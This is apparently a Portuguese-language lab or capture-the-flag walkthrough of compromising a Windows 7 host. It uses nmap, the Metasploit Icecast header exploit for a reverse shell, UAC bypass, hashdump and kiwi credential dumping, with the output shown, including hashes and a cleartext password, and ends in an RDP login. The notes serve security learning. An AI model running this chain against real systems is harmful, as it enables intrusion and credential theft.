- tentar conectar na web o ip 10.10.4.126
	nao tem nada
	
- ─$ sudo nmap -sV --top-ports 100 `cat ip` -Pn 
	procurar as portas
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http         Icecast streaming media server -> tentar entrar na porta 8000
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.62 seconds

-caso o nmap de cima nao funcione, tentar porta por porta:─$ sudo nmap -sS -p 1:1000 `cat ip` -Pn   (porta 1 ao 1000 e assim por diante) 

- ─$ sudo nmap -sV -p 8000 `cat ip` -Pn -> comando para procurar o que e a porta 8000

─$ sudo nmap -sV -p 135,139 `cat ip` -Pn -> comando para procurar o que e a porta 135 e 139

$ sudo nmap -sC -p 139 `cat ip` -Pn -> comando para executar alguns scripts na porta 139
Host script results:
|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -2s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00


└─$ sudo nmap -sC -p 8000 `cat ip` -Pn -> procurar a versao do icecast 

- msfconsole -> 
	search icecast
	use exploit/windows/http/icecast_header
		info
		show options
		msf6 exploit(windows/http/icecast_header) > set RHOST 10.10.28.139 -> setar maquina alvo
		msf6 exploit(windows/http/icecast_header) > set LHOST 10.9.75.113 -> setar ip maquina atual 
		depois de setar executar o comando "exploit", ele ira fazer um shell reverse 
		
- apos conectar na maquina executar o comando sysinfo 

- comando ps -> processos, como se fosse o gerenciado de tarefas   

- comando getprivs -> verifica os privilegios

- run post/multi/recon/local_exploit_suggester -> procurar uma lista de exploit e verifica se tem algum exploit que e possivel rodar na maquina
#   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.


- sair da maquina (ctrl+z) e executar o use exploit/windows/local/bypassuac_eventvwr e setar o RHOST e LHOST
- set SESSION 1
- set LHOST 10.9.75.113

- executar o exploit

- realizar o ps para verificar com mais detalhes o processo

- migrate -N spoolsv.exe -> 

- hashdump -> pegar senha de admin
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

- load kiwi -> comando para roubar credenciais 
	nao funcionou porque nao estamos como system ainda, entao pegar um processo que esta rodando como system e executar migrate -N svchost.exe e executar load kiwi novamente
	
- creds_all -> pegar todas credenciasi

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!


- voltar no terminal da nossa maquina e executar o rdesktop `cat ip` -u Dark -p Password01! , para acessar o desktop do alvo  



 


